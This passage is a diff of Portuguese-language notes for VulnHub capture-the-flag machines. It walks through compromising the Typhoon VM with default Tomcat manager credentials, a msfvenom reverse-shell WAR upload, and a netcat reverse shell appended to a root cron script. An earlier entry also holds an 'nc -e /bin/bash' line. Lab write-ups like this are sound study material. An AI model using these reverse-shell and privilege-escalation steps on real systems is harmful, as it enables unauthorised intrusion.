@@ -17,8 +17,11 @@ Desafio 14 - https://www.vulnhub.com/entry/the-library-1,334/ 	</br>
 Desafio 15 - https://www.vulnhub.com/entry/symfonos-2,331/</br>
 Desafio 16 - https://www.vulnhub.com/entry/symfonos-31,332/</br>
 Desafio 17 - Manual Webmin 1.920 exploit | CVE-2019-15107 | Crontab - https://www.vulnhub.com/entry/nezuko-1,352/ </br>
-Desafio 18 - https://www.vulnhub.com/entry/typhoon-102,267/ </br>
-Desafio 19 - -</br>
+Desafio 18 - CWE-521 | Tomcat7 bad .jsp | CWE-732 crontab  	    - https://www.vulnhub.com/entry/typhoon-102,267/ </br>
+Desafio 19 -  - https://www.vulnhub.com/entry/prime-1,358/</br>
+Desafio 20 - - </br>
+
+<br> <h2>[Write-up vídeo](https://www.youtube.com/channel/UCnWSqlqL8D365ps5IECrPyg) </h2></br>
 <br/>**--VM--**
 	
 	
@@ -782,3 +785,42 @@ Desafio 19 - -</br>
 			#echo “nc 10.0.0.4 80 -e /bin/bash” >> send_message_to_nezuko.sh
 			
 			Basta esperar pois como visto no pspy, a x tempo é executado um comando relacionado ao send_message_to_nezuko.sh, então adicionando o nc 10.0.0.4 80 -e /bin/bash, em algum momento ele irá se conectar ao kali pelo nc
+
+
+<h3>Dia 18 			24/9/2020</h3>
+
+	*Scan
+		-sV -p-
+		
+	*ip:8080
+		#manager webapp
+		user: default ->  tomcat
+		password: default ->  tomcat
+		
+	*msfvenom
+		msfvenom -p linux/x86/shell_reverse_tcp lhost=ip_kali lport=443 -f war -o beco.war
+	
+	7z -l beco.war
+		copiar o nome do arquivo *.jsp
+			exemplo: quoehctpngtojxo.jsp
+			
+		*upload no tomcat
+			server status -> list applications -> desce: War file to deploy
+			
+		*nc -lnvp 443
+		
+		*http://192.168.100.24:8080/beco/quoehctpngtojxo.jsp
+		
+		*pspy
+			kali: python -m SimpleHTTPServer 8081
+			wget 192.168.100.4:8081/pspy-master
+			chmod +x pspy-master
+			./pspy-master
+				#CRON
+					/tab/script.sh
+			
+		*msfvenom -p cmd/linux/reverse_netcat lhost=192.168.100.4 lport=444 -f raw
+		
+		*nc -lnvp 444
+		
+		*echo 'mkfifo /tmp/kncu; nc 192.168.100.4 444 0</tmp/kncu | /bin/sh >/tmp/kncu 2>&1; rm /tmp/kncu' >> script.sh
